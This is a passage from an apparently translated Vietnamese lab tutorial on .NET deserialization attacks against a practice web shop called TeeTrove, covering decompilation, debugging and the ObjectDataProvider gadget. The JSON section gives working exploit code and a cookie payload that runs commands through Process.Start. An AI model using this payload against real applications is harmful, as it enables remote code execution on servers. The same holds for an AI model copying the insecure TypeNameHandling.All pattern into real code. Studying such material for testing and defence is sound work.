# MỤC LỤC
## **Giới thiệu về Tấn công Deserialization trong .NET**
- [1. Giới thiệu về Tấn công Deserialization trong .NET](#1-giới-thiệu-về-tấn-công-deserialization-trong-net)

## **Dịch ngược và Phân tích ứng dụng .NET**
- [2. Dịch ngược ứng dụng .NET](#2-dịch-ngược-ứng-dụng-net)
- [3. Xác định các hàm dễ bị tổn thương trong .NET](#3-xác-định-các-hàm-dễ-bị-tổn-thương-trong-net)

## **Các ví dụ khai thác Deserialization**
- [4. Cài Đặt trên Internet Information Services (IIS)](#4-cài-đặt-trên-internet-information-services-iis)
- [5. Gadget ObjectDataProvider và Deserialization Các Tấn Công](#5-gadget-objectdataprovider-và-deserialization-các-tấn-công)
- [6. Ví dụ 1: JSON](#6-ví-dụ-1-json)
- [7. Ví dụ 2: XML](#7-ví-dụ-2-xml)
- [8. Loại tiện ích ConfuseDelegate](#8-loại-tiện-ích-confusedelegate)
- [9. Ví dụ 3: Khai thác lỗ hổng BinaryFormatter](#9-ví-dụ-3-khai-thác-lỗ-hổng-binaryformatter)

## **Tự động hóa và công cụ khai thác**
- [10. Tự động hóa khai thác với YSoSerial.NET](#10-tự-động-hóa-khai-thác-với-ysoserialnet)

## **Ngăn chặn và Phòng ngừa các lỗ hổng Deserialization**
- [11. Ngăn chặn các lỗ hổng Deserialization](#11-ngăn-chặn-các-lỗ-hổng-deserialization)

---
# 1. Giới thiệu về Tấn công Deserialization trong .NET

**Lưu ý:** Để hiểu rõ các khái niệm trong module này, bạn cần có một số kiến thức cơ bản về lỗ hổng deserialization cũng như kỹ năng lập trình cơ bản, đặc biệt là trong **C#/.NET**. Mặc dù module này cung cấp một môi trường Windows VM tùy chỉnh cho việc phát triển exploit trong một số phần, việc có một môi trường máy tính cá nhân sẽ hữu ích.

---

### **Deserialization là gì?**

**Serialization** là quá trình chuyển đổi một đối tượng trong bộ nhớ thành một chuỗi các byte. Dữ liệu này có thể được lưu trữ hoặc truyền qua mạng và sau đó có thể được khôi phục lại vào một môi trường chương trình hoặc máy tính khác. **Deserialization** là hành động ngược lại, khi dữ liệu đã được serialized được khôi phục lại thành đối tượng ban đầu.

Tuy nhiên, khi ứng dụng deserializes dữ liệu do người dùng kiểm soát, có nguy cơ xuất hiện các lỗ hổng deserialization, và các lỗ hổng này có thể bị khai thác để đạt được các mục tiêu như:

- **Remote Code Execution (RCE)** – Thực thi mã từ xa
- **Object Injection** – Tiêm đối tượng
- **Arbitrary File Read** – Đọc tệp tùy ý
- **Denial of Service (DoS)** – Tấn công từ chối dịch vụ

Các ngôn ngữ lập trình như Java, Ruby, Python và PHP đều cung cấp thư viện xử lý serialization và deserialization. Module này trước đó đã đề cập đến các tấn công deserialization cơ bản nhắm vào các ứng dụng web sử dụng PHP và Python.

---

### **Serialization trong .NET**

**C#**, ngôn ngữ lập trình chủ chốt của Microsoft sử dụng **.NET Framework**, cũng cung cấp nhiều công nghệ serialization. Đây là ngôn ngữ chính được sử dụng trong việc phát triển các ứng dụng web kết nối Internet bằng **ASP.NET Core**, một framework phát triển web được sử dụng rộng rãi trên toàn thế giới.

Hiểu rõ cách nhận diện và khai thác các lỗ hổng deserialization trong .NET không chỉ giúp củng cố bộ công cụ bảo mật tấn công của chúng ta, mà còn cung cấp cái nhìn về cách mà các tác nhân đe dọa có thể đạt được RCE sau khi khai thác **CVE-2023-34362** – lỗ hổng MOVEit đã gây ra sự tấn công quy mô toàn cầu.

Trong .NET, có ba công nghệ serialization chính:

1. **JSON Serialization**
2. **XML và SOAP**
3. **Binary Serialization**: Ghi lại trạng thái đầy đủ của đối tượng và bảo toàn tính đúng đắn của kiểu dữ liệu. Khi deserialization, một bản sao chính xác của đối tượng sẽ được tạo ra.

Module này sẽ tập trung vào các tấn công deserialization từ góc độ white-box, khai thác các lỗ hổng do JSON, XML và Binary serializer mà các nhà phát triển .NET sử dụng.

---

### **Các bước trong module này**

- **Decompiling** một tệp nhị phân để lấy mã nguồn và nhận diện các phần mã có thể dễ bị tấn công.
- **Debugging** để hỗ trợ phát triển exploit.
- Tạo ra **gadget chains** nổi tiếng và sử dụng chúng để khai thác ba lỗ hổng deserialization trong một ứng dụng tùy chỉnh.
- Xem xét ứng dụng từ góc độ của nhà phát triển để tìm hiểu cách bảo vệ mã nguồn và cách tránh các lỗ hổng trong tương lai.
- Cuối cùng, bạn sẽ có nhiệm vụ tự mình nhận diện và khai thác một lỗ hổng deserialization trong một ứng dụng tùy chỉnh.

---

### **Lịch sử tấn công Deserialization**

Lỗ hổng deserialization đã được công nhận công khai từ lâu, nhưng sự quan tâm tăng mạnh vào năm 2015 khi **gadget Apache Commons Collections** được phát hiện. Dưới đây là một số mốc quan trọng trong lịch sử các lỗ hổng và tấn công deserialization:

- **2007**: Lỗ hổng deserialization đầu tiên được đăng ký (**CVE-2007-1701**), cho phép kẻ tấn công thực thi mã tùy ý qua PHP.
- **2015**: Phát hiện của gadget Apache Commons Collections giúp làm sáng tỏ các kỹ thuật khai thác lỗ hổng deserialization phức tạp.

---

### **Tấn công trên Website "TeeTrove"**

Trong module này, chúng ta sẽ phân tích và tấn công một trang web tên **TeeTrove**, một nền tảng thương mại điện tử chuyên bán đồ thiết kế tùy chỉnh. Chúng ta sẽ thực hiện bài kiểm tra bảo mật cho ứng dụng web này nhằm mục đích **kiểm tra xâm nhập (penetration testing)** và đạt được **Remote Code Execution (RCE)**.

Công ty đứng sau TeeTrove đã cung cấp cho chúng ta các tệp triển khai đã biên dịch và các thông tin đăng nhập cần thiết để thực hiện đánh giá bảo mật này.

---

# 2. Dịch ngược ứng dụng .NET

#### **Giới thiệu**
Trong bài kiểm tra xâm nhập này, chúng ta đã được cung cấp các tệp triển khai của ứng dụng web, được viết bằng **C# / .NET** (xem tệp đính kèm dưới câu hỏi). Đây là thông tin hữu ích cho chúng ta, vì **.NET** cung cấp các công cụ mạnh mẽ để kiểm tra và phân tích các ứng dụng đã biên dịch.

---

### **Cài đặt dotPeek**

Để bắt đầu phân tích ứng dụng .NET, chúng ta sẽ sử dụng công cụ **dotPeek**, một phần mềm decompiler miễn phí từ **JetBrains**. Sau khi tải xuống và cài đặt, chúng ta sẽ có thể decompile (giải mã ngược) các tệp .NET và xem mã nguồn của chúng.

**Các bước cài đặt:**
1. Truy cập trang web của **JetBrains** và tải xuống trình cài đặt **dotPeek**.
2. Trong quá trình cài đặt, bỏ qua tất cả các sản phẩm ngoài **dotPeek**.
3. Ngoài ra, nếu bạn không muốn cài đặt, có thể tải xuống phiên bản **portable** (di động) từ cùng một trang và sử dụng mà không cần cài đặt.

---

### **Decompiling với dotPeek**

Sau khi đã cài đặt và mở **dotPeek**, chúng ta có thể tiến hành giải mã các tệp .NET được cung cấp.

**Các bước sử dụng dotPeek:**
1. Mở **dotPeek** và chọn **File > Open** từ thanh menu.
2. Chọn tệp **bin\TeeTrove.dll** trong trình quản lý tệp.
3. Sau khi mở tệp, **dotPeek** sẽ hiển thị assembly và danh sách lớp trong **Assembly Explorer** bên trái cửa sổ.
4. Từ đây, bạn có thể mở rộng các **namespace** và nhấp đôi vào các **class** để xem mã nguồn đã giải mã trong cửa sổ chính.
5. Lưu ý rằng quá trình decompiling không hoàn hảo, vì vậy bạn có thể thấy một số đoạn mã không chính xác hoặc lạ, như ví dụ trong hình ảnh dưới đây.

**Lưu mã nguồn đã giải mã:**
- Nhấp chuột phải vào assembly **TeeTrove** trong **Assembly Explorer** và chọn **Export to Project** để lưu mã nguồn đã giải mã dưới dạng giải pháp Visual Studio.
- Việc này rất hữu ích nếu bạn muốn sử dụng công cụ khác để phân tích hoặc tìm kiếm trong mã nguồn.

---

### **Cài đặt ILSpy**

Một công cụ khác để decompile các ứng dụng .NET là **ILSpy**, được phát triển bởi cộng đồng mã nguồn mở. Đây là một công cụ mạnh mẽ và dễ sử dụng.

**Các bước cài đặt:**
1. Truy cập trang GitHub của **ILSpy** và tải xuống phiên bản mới nhất.
2. Nếu bạn muốn sử dụng phiên bản di động, chọn tệp ZIP tự chứa. Nếu bạn muốn cài đặt, hãy chọn tệp MSI 64-bit.

**Sử dụng ILSpy:**
1. Mở **ILSpy** và sử dụng cửa sổ **Assemblies** tương tự như **dotPeek** để điều hướng qua các **namespace** và **class**.
2. Bạn có thể chọn từng **class** để xem mã nguồn đã giải mã trong cửa sổ chính.
3. Một điểm cần lưu ý là đầu ra của **ILSpy** có thể khác một chút so với **dotPeek** ở một số phần, nhưng nhìn chung **ILSpy** thường cung cấp kết quả gần hơn với mã gốc.

**Lưu mã nguồn đã giải mã:**
- Nhấp chuột phải vào assembly **TeeTrove** trong cửa sổ **Assemblies** và chọn **Save Code** để lưu mã nguồn đã giải mã và có thể mở lại bằng các công cụ khác.

---

### **Lưu Ý**

- Nếu bạn đang kết nối với một máy ảo Windows qua VPN, sử dụng **TCP** thay vì **UDP** sẽ giúp cải thiện kết nối và tránh các vấn đề về mạng.

---

# 3. Xác định các hàm dễ bị tổn thương trong .NET

#### **Giới thiệu**
Bây giờ khi chúng ta đã decompile ứng dụng **TeeTrove** (dù là bằng **dotPeek** hay **ILSpy**), chúng ta có thể bắt đầu tìm kiếm các lỗ hổng tiềm ẩn trong mã nguồn. Trong module này, mục tiêu là tìm kiếm các lỗ hổng **deserialization** trong mã nguồn của ứng dụng.

#### **Các Hàm Có Thể Dễ Bị Tấn Công**
Trong **C# / .NET**, có nhiều công cụ và thư viện khác nhau để thực hiện **serialization** và **deserialization** dữ liệu, bao gồm các dạng như **binary**, **JSON**, **YAML**, và các định dạng khác. Một số thư viện này có thể dễ bị tấn công và có thể bị khai thác theo cách tương tự nhau. 

Dưới đây là bảng các thư viện **.NET** phổ biến cùng với ví dụ về cách gọi hàm deserialization và tài liệu tham khảo tương ứng. Khi tiến hành kiểm tra xâm nhập với quyền truy cập vào mã nguồn, tìm kiếm các hàm này có thể giúp chúng ta nhanh chóng nhận diện các lỗ hổng **deserialization** tiềm ẩn.

| **Serializer**                | **Ví Dụ Hàm Deserialization**      | **Tài Liệu Tham Khảo**             |
|-------------------------------|------------------------------------|-----------------------------------|
| **BinaryFormatter**            | `.Deserialize(...)`               | [Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.8) |
| **fastJSON**                   | `JSON.ToObject(...)`              | [GitHub](https://github.com/fastjson/fastjson) |
| **JavaScriptSerializer**       | `.Deserialize(...)`               | [Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view=netframework-4.8) |
| **Json.NET**                   | `JsonConvert.DeserializeObject(...)`| [Newtonsoft](https://www.newtonsoft.com/json) |
| **NetDataContractSerializer**  | `.ReadObject(...)`                | [Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8) |
| **ObjectStateFormatter**       | `.Deserialize(...)`               | [Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter?view=netframework-4.8) |
| **SoapFormatter**              | `.Deserialize(...)`               | [Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8) |
| **XmlSerializer**              | `.Deserialize<...>(...)`          | [Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.8) |
| **YamlDotNet**                 | `.Deserialize(...)`               | [GitHub](https://github.com/aaubry/YamlDotNet) |
| **ViewState**                  | `.Deserialize(...)`               | [Microsoft](https://docs.microsoft.com/en-us/aspnet/web-forms/overview/getting-started/understanding-viewstate) |

Bên cạnh các thư viện trên, **ViewState** là một tính năng trong ASP.NET để duy trì trạng thái của một trang web. Quá trình này bao gồm việc lưu trữ một tham số đã được serialized trong một cookie gọi là **__VIEWSTATE**, và đôi khi có thể bị lợi dụng nếu máy chủ bị cấu hình sai. Tuy nhiên, **tấn công ViewState** sẽ không được đề cập trong module này.

---

#### **Nhận Dạng Các Hàm Deserialization Có Thể Bị Tấn Công**

Khi kiểm tra mã nguồn, một cách hiệu quả để tìm các lỗ hổng **deserialization** là tìm kiếm các hàm deserialization được gọi trong mã. Tuy nhiên, đôi khi cách triển khai của các hàm này có thể thay đổi, và sự khác biệt nhỏ trong cách viết mã có thể tạo ra sự khác biệt lớn về tính bảo mật.

**Ví dụ về sự khác biệt trong cách triển khai hàm deserialization:**

- **Ví dụ 1:**

```csharp
public class ExampleClass
{
    public JavaScriptSerializer Serializer { get; set; }

    public Person Deserialize<Person>(string str)
    {
        return this.Serializer.Deserialize<Person>(str);
    }
}
```

Trong trường hợp này, một kẻ tấn công có thể điều khiển cách khởi tạo đối tượng **Serializer**, khiến cho deserialization trở nên dễ bị tấn công nếu sử dụng **SimpleTypeResolver**.

- **Ví dụ 2:**

```csharp
public class ExampleClass
{
    public Person Deserialize<Person>(string str)
    {
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        return serializer.Deserialize<Person>(str);
    }
}
```

Trong ví dụ này, **JavaScriptSerializer** được khởi tạo mỗi khi hàm **Deserialize** được gọi, do đó không có khả năng bị tấn công, vì **SimpleTypeResolver** không được sử dụng.

**Giải thích:** 
- **Ví dụ 1** có thể bị tấn công, vì một kẻ tấn công có thể kiểm soát đối tượng **Serializer** và nếu **SimpleTypeResolver** được sử dụng trong quá trình deserialization, lỗ hổng có thể bị khai thác.
- **Ví dụ 2** an toàn hơn, vì mỗi lần gọi hàm **Deserialize** sẽ khởi tạo một đối tượng **JavaScriptSerializer** mới, không có khả năng bị điều khiển từ bên ngoài.

Điều này minh họa cách một sự khác biệt nhỏ trong cách triển khai có thể tạo ra một lỗ hổng bảo mật. Vì vậy, việc kiểm tra kỹ lưỡng các cách triển khai deserialization là rất quan trọng trong quá trình kiểm tra xâm nhập.

---

# 4. Cài Đặt trên Internet Information Services (IIS)

#### **Giới thiệu**
Các tệp triển khai mà chúng ta nhận được cho ứng dụng **TeeTrove** không phải là các tệp độc lập, vì chúng ta cần một chương trình khác để chạy ứng dụng. Trong trường hợp này, chúng ta sẽ sử dụng **IIS (Internet Information Services)** để phục vụ ứng dụng web cục bộ, giúp chúng ta có thể debug ứng dụng.

#### **Bật IIS trên Windows**
**IIS** đi kèm với Windows, nhưng có thể không được bật mặc định trên hệ thống của bạn. Để bật **IIS**, làm theo các bước sau:

1. Mở **Start Menu** và tìm kiếm **Turn Windows features on or off**.
2. Trong cửa sổ mở ra, tìm và chọn **Internet Information Services**.
3. Mở rộng các mục và đảm bảo rằng các tính năng sau được bật (đặc biệt chú ý các mục được tô đỏ):
   - **Web Management Tools**
   - **World Wide Web Services**
   - **Application Development Features** (bao gồm **ASP.NET**)
   - **Security** (bao gồm **Request Filtering**)
4. Sau khi chọn xong, nhấn **OK**, và Windows sẽ tự động tải xuống các tệp thiếu (nếu có).

#### **Cấu Hình IIS**
Trước khi cấu hình **IIS**, cần đảm bảo rằng các tệp triển khai đã được giải nén vào một thư mục mà máy chủ có thể truy cập, ví dụ **C:\inetpub\wwwroot**. Tiếp theo, chúng ta cần sửa đổi tệp **Web.config** để ứng dụng có thể truy cập đúng tệp cơ sở dữ liệu. Mở **Web.config** trong trình soạn thảo văn bản yêu thích, cuộn xuống dưới cùng và cập nhật giá trị của **Data Source** thành đường dẫn đầy đủ tới tệp **TeeTrove.db**.

Sau đó, làm theo các bước dưới đây để cấu hình **IIS**:

1. Mở **Start Menu** và tìm kiếm **Internet Information Services (IIS) Manager**.
2. Nhấn chuột phải vào **Sites** và chọn **Add Website**.
3. Trong cửa sổ popup, điền các thông tin như sau:
   - **Site name**: TeeTrove
   - **Physical path**: Chỉ đến thư mục nơi bạn giải nén các tệp ứng dụng.
   - **Port**: 8000
   - **Application Pool**: Chọn **.NET v4.5**, nếu không, ứng dụng sẽ không hoạt động đúng.
4. Nhấn **OK**, và bây giờ **TeeTrove** sẽ có thể truy cập tại **http://localhost:8000**.

Cuối cùng, một bước quan trọng nữa là đảm bảo ứng dụng có thể ghi vào cơ sở dữ liệu. Tới thư mục nơi chứa các tệp triển khai, nhấn chuột phải vào thư mục đó và chỉnh sửa quyền để người dùng **IIS_IUSRS** có quyền ghi vào thư mục.

---

### **Gỡ Lỗi (Debugging) Ứng Dụng TeeTrove**

#### **Chuẩn Bị Các Tệp DLL Cho Debugging**
Trước khi có thể bắt đầu gỡ lỗi, chúng ta cần chuẩn bị các tệp của ứng dụng. Mặc định, **IIS** sẽ tối ưu hóa các assembly, điều này có thể gây khó khăn khi gỡ lỗi. Để tắt tối ưu hóa này, chúng ta có thể sử dụng một script **PowerShell**.

1. Tải **PowerShell Module** và chạy các lệnh sau (thay đường dẫn cuối bằng nơi bạn đã lưu ứng dụng):

```powershell
PS C:\> Import-Module .\IISAssemblyDebugging.psm1
PS C:\> Enable-IISAssemblyDebugging C:\inetpub\wwwroot\TeeTrove.Publish\
```

Lệnh trên sẽ giúp tắt tối ưu hóa và chuẩn bị các tệp DLL để gỡ lỗi.

#### **Cài Đặt dnSpy**
Bây giờ chúng ta sẽ chuẩn bị môi trường gỡ lỗi. Để làm điều này, chúng ta cần cài đặt **dnSpy**, công cụ gỡ lỗi cho .NET.

1. Truy cập trang **GitHub Releases** của **dnSpy** và tải về tệp **win64.zip** mới nhất.
2. Giải nén tệp vừa tải về và công cụ đã sẵn sàng sử dụng.

#### **Gỡ Lỗi Ứng Dụng TeeTrove Với dnSpy**

1. Mở **dnSpy** với quyền **Administrator**.
2. Giao diện của **dnSpy** sẽ tương tự như **ILSpy** hoặc **dotPeek**, với **Assembly List** ở bên trái và cửa sổ chính hiển thị mã nguồn decompiled.
3. Từ menu **File**, chọn **Open** và mở tất cả các tệp **DLL** trong thư mục ứng dụng.
4. Chọn **Debug > Attach to Process** và tìm **w3wp.exe** (ứng dụng web của IIS). Nếu không thấy, gửi một yêu cầu đến ứng dụng web và nhấn **Refresh**, nó sẽ hiển thị.
5. Bây giờ bạn có thể bắt đầu gỡ lỗi. Mở **TeeTrove.Controllers.AuthController**, đặt điểm dừng (breakpoint) tại dòng 18.
6. Thử truy cập **http://localhost:8000/Auth/Login** trong trình duyệt, ứng dụng sẽ dừng lại tại breakpoint, cho phép bạn đi qua từng dòng mã và xem giá trị của các biến.

---

# 5. Gadget ObjectDataProvider và Deserialization Các Tấn Công

#### **Khái Niệm Gadget**
Trong các cuộc kiểm thử xâm nhập, để đạt được các mục tiêu như ghi tệp tùy ý hoặc thực thi mã từ xa thông qua một cuộc tấn công deserialization, cần phải sử dụng một **gadget**, và trong một số trường hợp, là sự kết hợp của nhiều gadget gọi là **gadget chain**. Một **gadget** là một đối tượng được cấu hình theo cách đặc biệt để thực hiện một chuỗi hành động nhất định khi bị deserialized, đặc biệt là các hành động mà kẻ tấn công muốn thực hiện.

Chú ý: Việc xác định các **gadget** và thư viện deserialization dễ bị tấn công là một công việc yêu cầu nghiên cứu sâu và vượt ngoài phạm vi của module này. Chúng ta sẽ dựa vào các phát hiện và bài báo công khai.

---

#### **ObjectDataProvider Là Gì?**
Một trong những gadget phổ biến trong **.NET** có thể được sử dụng để thực thi các lệnh tùy ý là lớp **ObjectDataProvider**. Theo tài liệu của **Microsoft**, lớp **ObjectDataProvider** có thể được sử dụng để "bao bọc và tạo ra một đối tượng có thể sử dụng làm nguồn liên kết (binding source)." Mô tả này có thể không rõ ràng ngay lập tức, nhưng nếu nhìn vào ví dụ mà Microsoft cung cấp, chúng ta có thể hiểu rõ hơn.

Dưới đây là một ví dụ về cách **ObjectDataProvider** được sử dụng trong **Windows Presentation Foundation (WPF)**, một framework của .NET để phát triển giao diện người dùng (GUI) với **XAML** (biến thể của **XML** do Microsoft phát triển).

```xml
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:src="clr-namespace:SDKSample"
        xmlns:system="clr-namespace:System;assembly=mscorlib"
        SizeToContent="WidthAndHeight"
        Title="Simple Data Binding Sample">
    <Window.Resources>
        <ObjectDataProvider x:Key="myDataSource" ObjectType="{x:Type src:Person}">
            <ObjectDataProvider.ConstructorParameters>
                <system:String>Joe</system:String>
            </ObjectDataProvider.ConstructorParameters>
        </ObjectDataProvider>
    </Window.Resources>
    <Border Margin="25" BorderBrush="Aqua" BorderThickness="3" Padding="8">
        <DockPanel Width="200" Height="100">
            <TextBlock Text="{Binding Source={StaticResource myDataSource}, Path=Name}"/>
        </DockPanel>
    </Border>
</Window>
```

Trong ví dụ trên, **ObjectDataProvider** được sử dụng để tạo một đối tượng **Person**, với tên là "Joe". Sau đó, thuộc tính **Name** của đối tượng này được hiển thị trong một **TextBlock**. 

Điều quan trọng ở đây là, khi chúng ta deserialize một đối tượng trong **.NET**, không thể thực thi bất kỳ hàm nào, nhưng **ObjectDataProvider** lại có thể thực thi mã khi deserialized mà không cần gọi bất kỳ hàm nào. Đây chính là điểm quan trọng mà các kẻ tấn công có thể lợi dụng.

---

#### **Cách ObjectDataProvider Hoạt Động**
Để hiểu tại sao **ObjectDataProvider** có thể thực thi mã khi deserialized, chúng ta có thể mở **PresentationFramework.dll** trong công cụ như **ILSpy** để xem xét mã nguồn decompiled và tìm hiểu cách hoạt động của lớp này.

1. Mở **ILSpy**, chọn **File > Open from GAC** để mở thư viện từ **Global Assembly Cache (GAC)**, trong trường hợp này là **PresentationFramework**.
2. Điều hướng đến **System.Windows.Data** và tìm **ObjectDataProvider**.
3. Mở mã nguồn decompiled và chú ý rằng **ObjectDataProvider** kế thừa từ **DataSourceProvider**, và nó ghi đè phương thức **BeginQuery**.
4. Khi **BeginQuery** được gọi, nó tiếp tục thực thi mã trong hàm **QueryWorker**, nơi một đối tượng mới được tạo và phương thức của đối tượng đó sẽ được gọi nếu tham số **MethodName** được chỉ định.

Điều này cho phép **ObjectDataProvider** tạo một đối tượng và gọi một phương thức tùy ý mà không cần bất kỳ hàm gọi nào từ phía người sử dụng. Điều này đặc biệt nguy hiểm nếu kẻ tấn công có thể điều khiển tham số **MethodName** và **ConstructorParameters**.

---

#### **Ví Dụ Thực Tế**
Chúng ta có thể sử dụng **ObjectDataProvider** để tạo một đối tượng của lớp **System.Diagnostics.Process** và gọi phương thức **Start** với các tham số để thực thi một chương trình, ví dụ như mở ứng dụng máy tính (calculator).

Mã C# dưới đây minh họa cách sử dụng **ObjectDataProvider** để thực thi một lệnh tùy ý:

```csharp
using System;
using System.Windows.Data;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        // Tạo đối tượng ObjectDataProvider
        ObjectDataProvider provider = new ObjectDataProvider();
        provider.ObjectType = typeof(System.Diagnostics.Process);
        provider.MethodName = "Start";
        provider.ConstructorParameters.Add("calc.exe");  // Tham số mở ứng dụng calculator

        // Gọi phương thức Start
        provider.Refresh();
    }
}
```

Trong ví dụ này, **ObjectDataProvider** tạo ra một đối tượng **Process**, và gọi phương thức **Start** với tham số `"calc.exe"`, dẫn đến việc mở ứng dụng máy tính trên hệ thống.

---

# 6. ví dụ 1: JSON
### **Phát triển khai thác lỗ hổng trong chức năng "Remember Me" của TeeTrove**

#### **Bối cảnh và Phân tích**
Trong ứng dụng web TeeTrove, chức năng "Remember Me" dựa vào một cookie có tên là `TTREMEMBER`, lưu trữ thông tin xác thực người dùng dưới dạng một đối tượng đã được tuần tự hóa (serialized) bằng **JSON**. Phương thức **createCookie** chịu trách nhiệm tuần tự hóa đối tượng người dùng và lưu trữ nó trong cookie, trong khi phương thức **validateCookieAndReturnUser** tuần tự hóa ngược lại (deserialization).

Lỗ hổng xảy ra do cài đặt tuần tự hóa ngược không an toàn, đặc biệt khi tuỳ chọn **TypeNameHandling** được cấu hình là **All**. Tuỳ chọn này cho phép tuần tự hóa các đối tượng từ nguồn bên ngoài và thực thi mã khi các đối tượng này được tạo ra, ví dụ như tuần tự hóa một đối tượng **ObjectDataProvider**, cho phép gọi các phương thức tùy ý và có thể thực thi lệnh hệ thống.

---

#### **Phân tích Mã và Lỗ hổng**

1. **Tạo Cookie:**
   Phương thức **createCookie** tuần tự hóa đối tượng `RememberMe` thành JSON và lưu vào cookie:
   ```csharp
   public static HttpCookie createCookie(CustomMembershipUser user)
   {
       RememberMe rememberMe = new RememberMe(user.Username, user.RememberToken);
       string jsonString = JsonConvert.SerializeObject(rememberMe);
       HttpCookie cookie = new HttpCookie(REMEMBER_ME_COOKIE_NAME, jsonString);
       cookie.Secure = true;
       cookie.HttpOnly = true;
       cookie.Expires = DateTime.Now.AddDays(30.0);
       return cookie;
   }
   ```

2. **Tuần tự hóa ngược không an toàn:**
   Cookie này sau đó được tuần tự hóa ngược (deserialized) trong phương thức **validateCookieAndReturnUser**, sử dụng **Json.NET** cho việc tuần tự hóa. Cài đặt **TypeNameHandling** rất quan trọng vì nó cho phép các đối tượng như **ObjectDataProvider** được tuần tự hóa ngược và thực thi lệnh:
   ```csharp
   JsonSerializerSettings settings = new JsonSerializerSettings()
   {
       TypeNameHandling = TypeNameHandling.All
   };
   ```

   **TypeNameHandling.All** cho phép các đối tượng mà bộ tuần tự hóa hiểu như những đối tượng thực tế trong .NET, cho phép gọi các phương thức như `System.Diagnostics.Process.Start`, từ đó thực thi mã độc.

---

#### **Phát triển khai thác**

Để khai thác lỗ hổng này, chúng ta cần tạo một đối tượng JSON độc hại sao cho khi nó được tuần tự hóa ngược, sẽ thực thi một lệnh hệ thống như mở **cmd.exe** hoặc **notepad.exe**.

1. **Tạo Payload Khai Thác:**
   Chúng ta sử dụng **ObjectDataProvider** để xác định phương thức cần thực thi (`Start` trên `System.Diagnostics.Process`) và các tham số cho phương thức đó (ví dụ: `"C:\\Windows\\System32\\cmd.exe"`).

   Ví dụ về payload cơ bản:
   ```json
   {
       "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
       "ObjectType": "System.Diagnostics.Process",
       "MethodParameters": {
           "$type": "System.Object[]",
           "$values": [
               "C:\\Windows\\System32\\cmd.exe",
               "/c calc.exe"
           ]
       },
       "MethodName": "Start"
   }
   ```

   Payload này sẽ yêu cầu tuần tự hóa ngược đối tượng để thực thi **calc.exe** thông qua `System.Diagnostics.Process.Start`. Mục tiêu là tiêm payload này vào cookie `TTREMEMBER`.

2. **Tạo và Kiểm tra Payload:**
   Chúng ta có thể viết một chương trình .NET nhỏ để tuần tự hóa đối tượng và tạo payload JSON:
   ```csharp
   using System;
   using System.Windows.Data;
   using Newtonsoft.Json;

   namespace RememberMeExploit
   {
       internal class Program
       {
           static void Main(string[] args)
           {
               ObjectDataProvider odp = new ObjectDataProvider
               {
                   ObjectType = typeof(System.Diagnostics.Process),
                   MethodName = "Start"
               };
               odp.MethodParameters.Add("C:\\Windows\\System32\\cmd.exe");
               odp.MethodParameters.Add("/c calc.exe");

               JsonSerializerSettings settings = new JsonSerializerSettings()
               {
                   TypeNameHandling = TypeNameHandling.All
               };

               string json = JsonConvert.SerializeObject(odp, settings);
               Console.WriteLine(json);  // In payload ra để sao chép
           }
       }
   }
   ```

3. **Sửa đổi Payload và Kiểm tra:**
   Ban đầu, chúng ta gặp lỗi do tên phương thức không hợp lệ (`Start1`). Sau khi sửa phương thức về `Start`, chúng ta có thể tạo ra đối tượng tuần tự hóa chính xác.

4. **Payload Cuối Cùng:**
   Payload độc hại cuối cùng sẽ như sau:
   ```json
   {
       "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
       "ObjectType": "System.Diagnostics.Process",
       "MethodParameters": {
           "$type": "System.Object[]",
           "$values": [
               "C:\\Windows\\System32\\cmd.exe",
               "/c calc.exe"
           ]
       },
       "MethodName": "Start"
   }
   ```

   Payload này, khi được chèn vào cookie `TTREMEMBER`, sẽ thực thi **calc.exe** khi được tuần tự hóa ngược.

---

#### **Khai thác Lỗ Hổng**

1. **Tiêm Cookie Độc Hại:**
   - Đăng nhập vào website TeeTrove với tài khoản như `pentest:pentest`.
   - Chọn tùy chọn "Remember Me".
   - Thay thế giá trị của cookie `TTREMEMBER` bằng payload đã tạo.
   - Đăng xuất và quan sát ứng dụng, bạn sẽ thấy **calc.exe** được mở ra khi cookie được tuần tự hóa ngược bởi server.

2. **Kiểm tra Khai thác:**
   Dùng công cụ **dnSpy** để xác nhận rằng đối tượng **ObjectDataProvider** đã được tuần tự hóa ngược chính xác. Bằng cách quan sát quá trình trong **Process Explorer**, bạn có thể xác nhận rằng một tiến trình mới (ví dụ: **notepad.exe**) đã được sinh ra từ việc khai thác này.

---

# 7. Ví dụ 2: XML
### **Tìm hiểu lỗ hổng deserialization trong XML**

**Khám phá Lỗ hổng**
Lỗ hổng deserialization có thể xảy ra khi ứng dụng web sử dụng XML để chuyển đổi dữ liệu giữa các đối tượng mà không kiểm tra đúng các kiểu dữ liệu (types). Ví dụ dưới đây liên quan đến ứng dụng **TeeTrove**, trong đó lỗ hổng nằm trong phương thức `Import` trong `Controllers.TeeController`.

Trong tài liệu của Microsoft, không có cảnh báo rõ ràng về các vấn đề bảo mật khi sử dụng `XmlSerializer`, chỉ có một đoạn nói rằng không nên tuần tự hóa các kiểu dữ liệu không tin cậy. Tuy nhiên, trong mã nguồn của ứng dụng, kiểu dữ liệu mà ứng dụng mong đợi là `TeeTrove.Models.Tee`, và đây là kiểu dữ liệu mà người dùng có thể kiểm soát vì nó được gửi trong yêu cầu HTTP.

**Ví dụ**: Một ứng dụng web có thể bị tấn công nếu kẻ tấn công kiểm soát được kiểu dữ liệu mà `XmlSerializer` sử dụng. Lỗ hổng này có thể cho phép kẻ tấn công thực thi mã độc khi deserialization xảy ra, giống như vụ tấn công **DotNetNuke** trước đây, nơi tấn công dựa vào việc kiểm soát kiểu dữ liệu khi tuần tự hóa.

---

### **Phát triển Exploit**

**Xem xét Payload của DNN**
